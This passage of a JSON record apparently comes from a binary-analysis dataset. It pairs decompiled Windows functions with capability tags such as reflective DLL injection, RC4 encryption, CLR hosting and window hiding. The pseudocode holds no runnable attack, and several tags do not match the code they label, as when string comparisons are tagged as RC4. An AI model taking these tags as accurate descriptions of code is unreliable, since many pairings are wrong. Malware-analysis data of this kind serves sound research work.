        "decompiled_code": "\nvoid __fastcall fcn.00466078(uint param_1, uint param_2)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack108;\n    int32_t iStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    var_18h = 0;\n    var_1ch = 0;\n    uStack52 = 0x466168;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    var_14h = 0;\n    fcn.00406298();\n    iVar1 = sub.oleaut32.dll_GetErrorInfo();\n    if (iVar1 == 0) {\n        fcn.00404cd4();\n        (**(_pe_dos_header + 0x10))();\n        fcn.00404cd4();\n        (**(_pe_dos_header + 0x14))();\n        fcn.00404cd4();\n        (**(_pe_dos_header + 0x18))();\n        uStack96 = 0;\n        uStack100 = 0x4660f5;\n        (**(_pe_dos_header + 0x1c))();\n    }\n    fcn.00404850();\n    fcn.00404850();\n    fcn.00404850();\n    iStack104 = fcn.00465a78(var_14h, var_1ch, var_18h, in_EAX);\n    uStack108 = var_14h;\n    if (iStack104 == 0) {\n        iStack104 = fcn.004045bc();\n        uStack108 = var_14h;\n    }\n    uStack96 = param_2;\n    // WARNING: Could not recover jumptable at 0x00403fe1. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x485014)(0xeedfade, 1, 7, &stack0xffffff94);\n    return;\n}\n",
        "token_count": 523
    },
    "0040e43c": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid fcn.0040e43c(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_WaitForSingleObject(*(in_EAX + 0x10), *(in_EAX + 0x18));\n    return;\n}\n",
        "token_count": 56
    },
    "00422580": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid fcn.00422580(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_WaitForSingleObject(*0x485854);\n    if (iVar1 == 0) {\n        fcn.00422574();\n    }\n    return;\n}\n",
        "token_count": 62
    },
    "00408950": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00408950(uint param_1, char *param_2)\n\n{\n    char *in_EAX;\n    char *pcVar1;\n    char *pcVar2;\n    char *pcVar3;\n    char *pcVar4;\n    char *pcVar5;\n    bool bVar6;\n    \n    pcVar1 = in_EAX;\n    if (in_EAX != NULL) {\n        pcVar1 = *(in_EAX + -4);\n    }\n    pcVar3 = param_2;\n    if (param_2 != NULL) {\n        pcVar3 = *(param_2 + -4);\n    }\n    pcVar2 = pcVar1;\n    if (pcVar3 < pcVar1) {\n        pcVar2 = pcVar3;\n    }\n    bVar6 = true;\n    do {\n        pcVar4 = in_EAX;\n        pcVar5 = param_2;\n        if (pcVar2 == NULL) break;\n        pcVar2 = pcVar2 + -1;\n        pcVar5 = param_2 + 1;\n        pcVar4 = in_EAX + 1;\n        bVar6 = *in_EAX == *param_2;\n        in_EAX = pcVar4;\n        param_2 = pcVar5;\n    } while (bVar6);\n    if (!bVar6) {\n        pcVar1 = pcVar4[-1];\n        pcVar3 = pcVar5[-1];\n    }\n    return pcVar1 - pcVar3;\n}\n",
        "token_count": 332
    },
    "004089a0": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004089a0(uint param_1, char *param_2)\n\n{\n    char *pcVar1;\n    char *pcVar2;\n    char *in_EAX;\n    char *pcVar3;\n    char *pcVar4;\n    char *pcVar5;\n    uint8_t uVar6;\n    uint16_t uVar7;\n    uint8_t uVar8;\n    bool bVar9;\n    \n    pcVar3 = in_EAX;\n    if (in_EAX != NULL) {\n        pcVar3 = *(in_EAX + -4);\n    }\n    pcVar5 = param_2;\n    if (param_2 != NULL) {\n        pcVar5 = *(param_2 + -4);\n    }\n    pcVar4 = pcVar3;\n    if (pcVar5 < pcVar3) {\n        pcVar4 = pcVar5;\n    }\n    bVar9 = true;\ncode_r0x004089bf:\n    do {\n        if (pcVar4 != NULL) {\n            pcVar4 = pcVar4 + -1;\n            pcVar2 = param_2 + 1;\n            pcVar1 = in_EAX + 1;\n            bVar9 = *in_EAX == *param_2;\n            in_EAX = pcVar1;\n            param_2 = pcVar2;\n            if (bVar9) goto code_r0x004089bf;\n        }\n        if (bVar9) goto code_r0x004089ed;\n        uVar6 = in_EAX[-1];\n        if ((0x60 < uVar6) && (uVar6 < 0x7b)) {\n            uVar6 = uVar6 - 0x20;\n        }\n        uVar7 = CONCAT11(param_2[-1], uVar6);\n        uVar8 = uVar7 >> 8;\n        if ((0x60 < uVar8) && (uVar8 < 0x7b)) {\n            uVar7 = CONCAT11(uVar8 - 0x20, uVar6);\n        }\n        uVar6 = uVar7 >> 8;\n        bVar9 = uVar7 == uVar6;\n        if (!bVar9) {\n            pcVar3 = uVar7;\n            pcVar5 = uVar6;\ncode_r0x004089ed:\n            return pcVar3 - pcVar5;\n        }\n    } while( true );\n}\n",
        "token_count": 533
    },
    "004271e8": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.004271e8(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = fcn.0042664c();\n    sub.gdi32.dll_SelectObject(*(in_EAX + 4), uVar1);\n    sub.gdi32.dll_SetROP2(*(in_EAX + 4), *(*(*(in_EAX + 0x10) + 0x18) * 2 + 0x483894));\n    return;\n}\n",
        "token_count": 108
    },
    "0043a620": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043a620(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_4h;\n    \n    *(*0x483bc4 + 0x180) = arg_8h;\n    sub.user32.dll_SetWindowLongA(arg_8h, 0xfffffffc, *(*0x483bc4 + 0x18c));\n    uVar1 = sub.user32.dll_GetWindowLongA(arg_8h, 0xfffffff0);\n    if ((uVar1 & 0x40000000) != 0) {\n        iVar2 = sub.user32.dll_GetWindowLongA(arg_8h, 0xfffffff4);\n        if (iVar2 == 0) {\n            sub.user32.dll_SetWindowLongA(arg_8h, 0xfffffff4, arg_8h);\n        }\n    }\n    sub.user32.dll_SetPropA(arg_8h, *0x485ab6, *0x483bc4);\n    sub.user32.dll_SetPropA(arg_8h, *0x485ab4, *0x483bc4);\n    iVar2 = *0x483bc4;\n    *0x483bc4 = 0;\n    uVar3 = (**(iVar2 + 0x18c))(arg_8h, arg_ch, arg_10h, arg_14h);\n    return uVar3;\n}\n",
        "token_count": 336
    },
    "00443298": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.00443298(void)\n\n{\n    int32_t *in_EAX;\n    \n    (**(*in_EAX + -0x10))();\n    sub.user32.dll_RemovePropA(in_EAX[0x60], *0x485ab6);\n    sub.user32.dll_RemovePropA(in_EAX[0x60], *0x485ab4);\n    return;\n}\n",
        "token_count": 84
    },
    "0045fe68": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0045fe68(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(in_EAX + 4) - *(param_2 + 4);\n    if (iVar2 == 0) {\n        iVar2 = *(in_EAX + 6) - *(param_2 + 6);\n    }\n    if (iVar2 == 0) {\n        iVar2 = *(in_EAX + 8) - *(param_2 + 8);\n    }\n    if (iVar2 == 0) {\n        iVar2 = *(in_EAX + 10) - *(param_2 + 10);\n    }\n    if (iVar2 == 0) {\n        iVar2 = *(in_EAX + 10) - *(param_2 + 10);\n    }\n    if (iVar2 == 0) {\n        iVar2 = *(in_EAX + 0xc) - *(param_2 + 0xc);\n    }\n    if (iVar2 == 0) {\n        iVar2 = *(in_EAX + 0xe) - *(param_2 + 0xe);\n    }\n    if (iVar2 == 0) {\n        iVar2 = *(in_EAX + 0x10) - *(param_2 + 0x10);\n    }\n    if (iVar2 == 0) {\n        return 1;\n    }\n    if (iVar2 < 1) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = 2;\n    }\n    return uVar1;\n}\n",
        "token_count": 363
    },
    "00409004": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.00409004(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.00404a88(0xc0000000, 0, 0, 2, 0x80, 0);\n    sub.kernel32.dll_CreateFileA(uVar1);\n    return;\n}\n",
        "token_count": 70
    },
    "00437078": {
        "rules": [
            "PEB access"
        ],
        "decompiled_code": "\nvoid fcn.00437078(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x4370a2;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    (**(*in_EAX + 0x30))();\n    *in_FS_OFFSET = uStack32;\n    return;\n}\n",
        "token_count": 126
    },
    "0044a8b8": {
        "rules": [
            "PEB access"
        ],
        "decompiled_code": "\nvoid fcn.0044a8b8(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x44a94b;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    uVar3 = *(in_EAX + 0x34);\n    uVar2 = sub.comctl32.dll_ImageList_Create\n                      (uVar3, *(in_EAX + 0x30), *(*(in_EAX + 0x41) * 4 + 0x483d14) | 0xfe, *(in_EAX + 0x38), \n                       *(in_EAX + 0x38));\n    *(in_EAX + 0x3c) = uVar2;\n    cVar1 = fcn.0044a6e0();\n    if (cVar1 == '\\0') {\n        fcn.0040675c();\n        fcn.0040c8dc();\n        fcn.00403fc0();\n    }\n    if (*(in_EAX + 0x44) != 0x1fffffff) {\n        fcn.0044aae0();\n    }\n    *in_FS_OFFSET = uVar3;\n    fcn.004045c8(0x44a952);\n    return;\n}\n",
        "token_count": 347
    },
    "00410870": {
        "rules": [
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00410870(int32_t *param_1)\n\n{\n    char cVar1;\n    \n    cVar1 = fcn.00417654();\n    if (cVar1 == '\\0') {\n        fcn.00410840();\n    }\n    else {\n        (**(*param_1 + 0x28))(1);\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "00434730": {
        "rules": [
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771"
        ],
        "decompiled_code": "\nvoid fcn.00434730(void)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = 0x434742;\n    cVar2 = (**(*in_EAX + 0x24))();\n    if (cVar2 != '\\0') {\n        piVar1 = in_EAX[10];\n        *(piVar1 + 0x82) = 1;\n        uStack20 = 0x434786;\n        uStack24 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe8;\n        puStack16 = &stack0xfffffffc;\n        (**(*piVar1 + 0xcc))();\n        *in_FS_OFFSET = uStack24;\n        *(in_EAX[10] + 0x208) = 0;\n        return;\n    }\n    return;\n}\n",
        "token_count": 228
    },
    "004182dc": {
        "rules": [
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004182dc(uint arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    int32_t iStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack8 = 0;\n    uStack12 = 0;\n    uStack16 = 0;\n    var_10h = 0;\n    uStack40 = 0x418337;\n    iStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    arg_8h_00 = &fcn.004182dc::var_10h;\n    (**(*in_EAX + 0x50))();\n    fcn.00417d14(arg_8h_00);\n    fcn.004107fc();\n    *in_FS_OFFSET = arg_8h_00;\n    uStack40 = 0x41833e;\n    iStack44 = 0x418336;\n    fcn.004104d4();\n    return;\n}\n",
        "token_count": 275
    },
    "0041834c": {
        "rules": [
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041834c(uint arg_8h)\n\n{\n    int32_t *in_EAX;\n    \n    (**(*in_EAX + 0x50))();\n    fcn.00417ff0();\n    return 1;\n}\n",
        "token_count": 56
    },
    "0043f944": {
        "rules": [
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043f944(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x43f9e0;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    cVar1 = fcn.004039b8();\n    if (cVar1 == '\\0') {\n        fcn.0041cbcc();\n    }\n    else {\n        (**(*in_EAX + 0x50))();\n        fcn.00449f50();\n        fcn.0044a088();\n        fcn.0043d848();\n        fcn.00449de8();\n        fcn.0044a1a8();\n        (**(*param_2 + 0x34))(in_EAX[0x48], in_EAX[0x49]);\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x43f9e7;\n    uStack28 = 0x43f9df;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 300
    },
    "0044294c": {
        "rules": [
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044294c(uint param_1, int32_t *param_2)\n\n{\n    (**(*param_2 + 0x68))();\n    return;\n}\n",
        "token_count": 42
    },
    "0044a088": {
        "rules": [
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044a088(uint param_1, uint param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    uchar in_ZF;\n    \n    fcn.004049d4(param_2);\n    if (!in_ZF) {\n        iVar2 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.004039dc();\n                if (piVar1 != NULL) {\n                    (**(*piVar1 + 0x68))();\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        fcn.0040461c();\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 193
    },
    "004253f8": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint16_t __fastcall fcn.004253f8(uint param_1, int32_t param_2)\n\n{\n    uint16_t uVar1;\n    uint8_t *in_EAX;\n    \n    uVar1 = 0;\n    do {\n        uVar1 = uVar1 << 5 & 0xff00 | (uVar1 << 5 | uVar1 >> 0xb) ^ *in_EAX;\n        in_EAX = in_EAX + 1;\n        param_2 = param_2 + -1;\n    } while (param_2 != 0);\n    return uVar1;\n}\n",
        "token_count": 136
    },
    "0045df74": {
        "rules": [
            "hide graphical window"
        ],
        "decompiled_code": "\nvoid fcn.0045df74(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (*(in_EAX + 0x84) != 0) {\n        cVar1 = fcn.00444380();\n        if (cVar1 != '\\0') {\n            uVar2 = fcn.0044407c();\n            iVar3 = sub.user32.dll_IsWindowVisible(uVar2);\n            if (iVar3 != 0) {\n                uVar2 = fcn.0044407c(0);\n                sub.user32.dll_ShowWindow(uVar2);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 154
    },
    "00403330": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403330(uint32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    char *in_EAX;\n    char *pcVar2;\n    \n    pcVar2 = in_EAX;\n    if (0xff < param_1) {\n        param_1 = 0xff;\n    }\n    do {\n        cVar1 = *param_2;\n        param_2 = param_2 + 1;\n        if (cVar1 == '\\0') break;\n        pcVar2 = pcVar2 + 1;\n        *pcVar2 = cVar1;\n        param_1 = param_1 - 1;\n    } while (param_1 != 0);\n    *in_EAX = pcVar2 - in_EAX;\n    return;\n}\n",
        "token_count": 176
    },
    "00403784": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00403784(uint param_1, int32_t param_2)\n\n{\n    uint8_t *in_EAX;\n    uint32_t uVar1;\n    uint8_t uVar2;\n    \n    uVar2 = 0;\n    if (param_2 != 0) {\n        in_EAX = *(in_EAX + -0x2c);\n        uVar1 = *in_EAX;\n        if (uVar1 == *(param_2 + -4)) {\n            do {\n                uVar2 = 0;\n                if (((in_EAX[uVar1] ^ *(uVar1 + param_2 + -1)) & 0xdf) != 0) goto code_r0x004037a7;\n                uVar1 = uVar1 - 1;\n            } while (uVar1 != 0);\n            uVar2 = 1;\n        }\n    }\ncode_r0x004037a7:\n    return in_EAX & 0xffffff00 | uVar2;\n}\n",
        "token_count": 225
    },
    "00403884": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00403884(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    do {\n        iVar1 = *in_EAX;\n        in_EAX = *(iVar1 + -0x24);\n        if (*(iVar1 + -0x40) != 0) {\n            fcn.00405034();\n        }\n    } while (in_EAX != NULL);\n    return;\n}\n",
        "token_count": 94
    },
    "004039dc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402c68)\n\nvoid __fastcall fcn.004039dc(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if (in_EAX != NULL) {\n        while (*in_EAX != param_2) {\n            in_EAX = *(*in_EAX + -0x24);\n            if (in_EAX == NULL) {\n                if (*0x485008 != NULL) {\n                    (**0x485008)();\n                }\n                fcn.00402c3c();\n                return;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 139
    },
    "00403a58": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00403a58(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    \n    while( true ) {\n        if (in_EAX == param_2) {\n            return 0x1;\n        }\n        piVar1 = *(in_EAX + -0x24);\n        if (piVar1 == NULL) break;\n        in_EAX = *piVar1;\n    }\n    return piVar1;\n}\n",
        "token_count": 117
    },
    "00404bcc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00404bcc(uint param_1, char *param_2)\n\n{\n    char *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    char *pcVar5;\n    char *pcVar6;\n    bool bVar7;\n    \n    if (in_EAX != NULL) {\n        if (param_2 == NULL) {\n            return 0;\n        }\n        iVar3 = *(in_EAX + -4) + -1;\n        if (-1 < iVar3) {\n            iVar1 = *(param_2 + -4) - iVar3;\n            bVar7 = iVar1 == 0;\n            pcVar5 = param_2;\n            if (!bVar7 && iVar3 <= *(param_2 + -4)) {\ncode_r0x00404bec:\n                do {\n                    if (iVar1 != 0) {\n                        iVar1 = iVar1 + -1;\n                        pcVar4 = pcVar5 + 1;\n                        bVar7 = *in_EAX == *pcVar5;\n                        pcVar5 = pcVar4;\n                        if (!bVar7) goto code_r0x00404bec;\n                    }\n                    iVar2 = iVar3;\n                    pcVar4 = in_EAX + 1;\n                    pcVar6 = pcVar5;\n                    if (!bVar7) goto code_r0x00404c00;\n                    do {\n                        if (iVar2 == 0) break;\n                        bVar7 = *pcVar4 == *pcVar6;\n                        iVar2 = iVar2 + -1;\n                        pcVar4 = pcVar4 + 1;\n                        pcVar6 = pcVar6 + 1;\n                    } while (bVar7);\n                } while (!bVar7);\n                in_EAX = pcVar5 + -param_2;\n                goto code_r0x00404c10;\n            }\n        }\ncode_r0x00404c00:\n        in_EAX = NULL;\n    }\ncode_r0x00404c10:\n    return CONCAT44(param_2, in_EAX);\n}\n",
        "token_count": 463
    },
    "00405028": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402c68)\n\nvoid __fastcall fcn.00405028(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    bool bVar2;\n    uint *in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar3 = 1;\n    cVar1 = *param_2;\n    if ((cVar1 != '\\n') && (cVar1 != '\\v')) {\n        if (cVar1 == '\\f') {\n            do {\n                *in_EAX = 0;\n                in_EAX[1] = 0;\n                in_EAX[2] = 0;\n                in_EAX[3] = 0;\n                in_EAX = in_EAX + 4;\n                iVar4 = iVar3 + -1;\n                bVar2 = 0 < iVar3;\n                iVar3 = iVar4;\n            } while (iVar4 != 0 && bVar2);\n            return;\n        }\n        if (cVar1 == '\\r') {\n            do {\n                fcn.00404f94();\n                iVar4 = iVar3 + -1;\n                bVar2 = 0 < iVar3;\n                iVar3 = iVar4;\n            } while (iVar4 != 0 && bVar2);\n            return;\n        }\n        if (cVar1 == '\\x0e') {\n            do {\n                fcn.00404f64();\n                iVar4 = iVar3 + -1;\n                bVar2 = 0 < iVar3;\n                iVar3 = iVar4;\n            } while (iVar4 != 0 && bVar2);\n            return;\n        }\n        if ((cVar1 != '\\x0f') && (cVar1 != '\\x11')) {\n            if (*0x485008 != NULL) {\n                (**0x485008)();\n            }\n            fcn.00402c3c();\n            return;\n        }\n    }\n    do {\n        *in_EAX = 0;\n        in_EAX = in_EAX + 1;\n        iVar4 = iVar3 + -1;\n        bVar2 = 0 < iVar3;\n        iVar3 = iVar4;\n    } while (iVar4 != 0 && bVar2);\n    return;\n}\n",
        "token_count": 496
    },
    "0040516c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402c68)\n// WARNING: Removing unreachable block (ram,0x004050ee)\n// WARNING: Removing unreachable block (ram,0x004050d4)\n\nvoid __fastcall fcn.0040516c(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    bool bVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar3 = 1;\n    cVar1 = *param_2;\n    if (cVar1 == '\\n') {\n        fcn.004045c8();\n    }\n    else if (cVar1 == '\\v') {\n        fcn.00404cd4();\n    }\n    else if (cVar1 == '\\f') {\n        do {\n            fcn.00405068();\n            iVar4 = iVar3 + -1;\n            bVar2 = 0 < iVar3;\n            iVar3 = iVar4;\n        } while (iVar4 != 0 && bVar2);\n    }\n    else if (cVar1 == '\\r') {\n        do {\n            fcn.00405080();\n            iVar4 = iVar3 + -1;\n            bVar2 = 0 < iVar3;\n            iVar3 = iVar4;\n        } while (iVar4 != 0 && bVar2);\n    }\n    else if (cVar1 == '\\x0e') {\n        do {\n            fcn.00405034();\n            iVar4 = iVar3 + -1;\n            bVar2 = 0 < iVar3;\n            iVar3 = iVar4;\n        } while (iVar4 != 0 && bVar2);\n    }\n    else if (cVar1 == '\\x0f') {\n        do {\n            fcn.00406298();\n            iVar4 = iVar3 + -1;\n            bVar2 = 0 < iVar3;\n            iVar3 = iVar4;\n        } while (iVar4 != 0 && bVar2);\n    }\n    else {\n        if (cVar1 != '\\x11') {\n            if (*0x485008 != NULL) {\n                (**0x485008)();\n            }\n            fcn.00402c3c();\n            return;\n        }\n        do {\n            fcn.00405b44();\n            iVar4 = iVar3 + -1;\n            bVar2 = 0 < iVar3;\n            iVar3 = iVar4;\n        } while (iVar4 != 0 && bVar2);\n    }\n    return;\n}\n",
        "token_count": 541
    },
    "0040585c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402c68)\n\nvoid __fastcall fcn.0040585c(int32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    bool bVar2;\n    int32_t iVar3;\n    \n    if (param_1 != 0) {\n        cVar1 = *param_2;\n        if (cVar1 == '\\n') {\n            if (param_1 < 2) {\n                fcn.004045c8();\n            }\n            else {\n                fcn.004045ec();\n            }\n        }\n        else if (cVar1 == '\\v') {\n            if (param_1 < 2) {\n                fcn.00404cd4();\n            }\n            else {\n                fcn.00404cec();\n            }\n        }\n        else if (cVar1 == '\\f') {\n            do {\n                fcn.00405068();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\r') {\n            do {\n                fcn.00405080();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\x0e') {\n            do {\n                fcn.00405034();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\x0f') {\n            do {\n                fcn.00406298();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else {\n            if (cVar1 != '\\x11') {\n                if (*0x485008 != NULL) {\n                    (**0x485008)();\n                }\n                fcn.00402c3c();\n                return;\n            }\n            do {\n                fcn.00405b44();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 578
    },
    "00405c68": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nchar * fcn.00405c68(void)\n\n{\n    char *in_EAX;\n    char *var_4h;\n    \n    var_4h = in_EAX;\n    while ((*var_4h != '\\0' && (*var_4h != '\\\\'))) {\n        var_4h = sub.user32.dll_CharNextA();\n    }\n    return var_4h;\n}\n",
        "token_count": 84
    },
    "00408b28": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00408b28(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.00404888();\n    for (iVar2 = 1; (iVar2 <= iVar1 && (*(in_EAX + -1 + iVar2) < 0x21)); iVar2 = iVar2 + 1) {\n    }\n    if (iVar1 < iVar2) {\n        fcn.004045c8();\n    }\n    else {\n        for (; *(in_EAX + -1 + iVar1) < 0x21; iVar1 = iVar1 + -1) {\n        }\n        fcn.00404ae8(param_2);\n    }\n    return;\n}\n",
        "token_count": 175
    },
    "00408bdc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00408bdc(uint32_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    int32_t iVar5;\n    uint8_t *unaff_ESI;\n    uint8_t *puVar6;\n    char cVar4;\n    \n    puVar6 = unaff_ESI;\n    if (param_1 == '\\0') {\n        if (in_EAX < 0) {\n            fcn.00408bf2();\n            unaff_ESI[-1] = 0x2d;\n            return;\n        }\n        param_1 = 10;\n    }\n    do {\n        uVar2 = in_EAX / param_1;\n        puVar6 = puVar6 + -1;\n        cVar4 = in_EAX % param_1;\n        uVar3 = cVar4 + 0x30;\n        if (0x39 < uVar3) {\n            uVar3 = cVar4 + 0x37;\n        }\n        *puVar6 = uVar3;\n        in_EAX = uVar2;\n    } while (uVar2 != 0);\n    iVar5 = param_2 - (unaff_ESI - puVar6);\n    if (unaff_ESI - puVar6 <= param_2 && iVar5 != 0) {\n        iVar1 = -iVar5;\n        while (iVar5 = iVar5 + -1,  iVar5 != 0) {\n            (puVar6 + iVar1)[iVar5] = 0x30;\n        }\n        puVar6[iVar1] = 0x30;\n    }\n    return;\n}\n",
        "token_count": 382
    },
    "0040939c": {
        "rules": [
            "contain loop"
        ],
